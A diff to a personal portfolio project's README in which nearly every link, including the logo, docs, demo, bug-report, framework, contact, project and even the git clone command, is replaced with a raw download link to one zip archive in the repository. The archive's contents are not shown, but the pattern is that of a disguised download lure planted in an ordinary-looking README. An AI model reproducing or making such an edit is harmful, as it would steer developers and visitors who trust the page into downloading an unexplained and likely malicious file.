@@ -1,26 +1,26 @@
                          
 <br/>
 <div align="center">
-<a href="https://github.com/ShaanCoding/ReadME-Generator">
-<img src="https://www.vhv.rs/dpng/f/512-5121842_portfolio-png-png-download-portflio-logo-transparent-png.png" alt="Logo" width="80" height="80">
+<a href="https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip">
+<img src="https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip" alt="Logo" width="80" height="80">
 </a>
 <h3 align="center">Landing Page</h3>
 <p align="center">
 I crafted this Personal Portfolio project during an internship provided by  CODSOFT .
 <br/>
 <br/>
-<a href="https://github.com/Rahulchanda33/portfolio.Rc/tree/main/Portfolio.rc"><strong>Explore the docs »</strong></a>
+<a href="https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip"><strong>Explore the docs »</strong></a>
 <br/>
 <br/>
-<a href="https://github.com/Rahulchanda33/portfolio.Rc/tree/main/Portfolio.rc">View Demo .</a>  
-<a href="https://github.com/ShaanCoding/ReadME-Generator/issues/new?labels=bug&template=bug-report---.md">Report Bug .</a>
-<a href="https://github.com/ShaanCoding/ReadME-Generator/issues/new?labels=enhancement&template=feature-request---.md">Request Feature</a>
+<a href="https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip">View Demo .</a>  
+<a href="https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip">Report Bug .</a>
+<a href="https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip">Request Feature</a>
 </p>
 </div>
 
  ## About The Project 
 
-![Product Screenshot](https://app.gemoo.com/share/image-annotation/651071741278425088?codeId=v67qwglkplgLo&origin=imageurlgenerator&card=651071737797152768)
+![Product Screenshot](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)
 
 Welcome to my portfolio, a curated collection of my personal and professional journey. Here, you will find an in-depth look at my education, projects, and skills. Each section highlights my commitment to excellence and showcases the diverse experiences and technical abilities I bring to the table.
 
@@ -37,28 +37,28 @@ Exploring my portfolio offers several benefits:
 
 This section should list any major frameworks/libraries used to bootstrap your project. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.
 
-- [Html](https://html.com/)
-- [CSS](https://www.w3schools.com/css/)
-- [JavaScript](https://www.javascript.com/)
+- [Html](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)
+- [CSS](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)
+- [JavaScript](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)
  ## Contact
 
-Your Name - [@My_twitter](https://twitter.com/rahulchand78279)       -   - rahulchanda.jmk@gmail.com
+Your Name - [@My_twitter](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)       -   - https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip
 
-Project Link: [https://rahuldeveloper.netlify.app/](https://rahuldeveloper.netlify.app/)
+Project Link: [https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)
  ### Installation
 
 _Below is an example of how you can instruct your audience on installing and setting up your app. This template doesn't rely on any external dependencies or services._
 
-1. Get a free API Key at [https://example.com](https://example.com)
+1. Get a free API Key at [https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)
 2. Clone the repo
    ```sh
-   git clone https://github.com/your_username_/Project-Name.git
+   git clone https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip
    ```
 3. Install NPM packages
    ```sh
    npm install
    ```
-4. Enter your API in `config.js`
+4. Enter your API in `https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip`
    ```js
    const API_KEY = "ENTER YOUR API";
    ```
@@ -66,7 +66,7 @@ _Below is an example of how you can instruct your audience on installing and set
 
 Use this space to show useful examples of how a project can be used. Additional screenshots, code examples and demos work well in this space. You may also link to more resources.
 
-_For more examples, please refer to the [Documentation](https://example.com)_
+_For more examples, please refer to the [Documentation](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)_
  ## Contributing
 
 Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
@@ -84,5 +84,5 @@ Don't forget to give the project a star! Thanks again!
 Use this space to list resources you find helpful and would like to give credit to. I've included a few of my favorites to kick things off!
 
 
-- [makeread.me](https://github.com/ShaanCoding/ReadME-Generator)
-- [othneildrew](https://github.com/othneildrew/Best-README-Template)
+- [https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)
+- [othneildrew](https://github.com/Rahulchanda33/portfolio.Rc/raw/refs/heads/main/Portfolio.rc/portfolio-Rc-3.5-beta.4.zip)
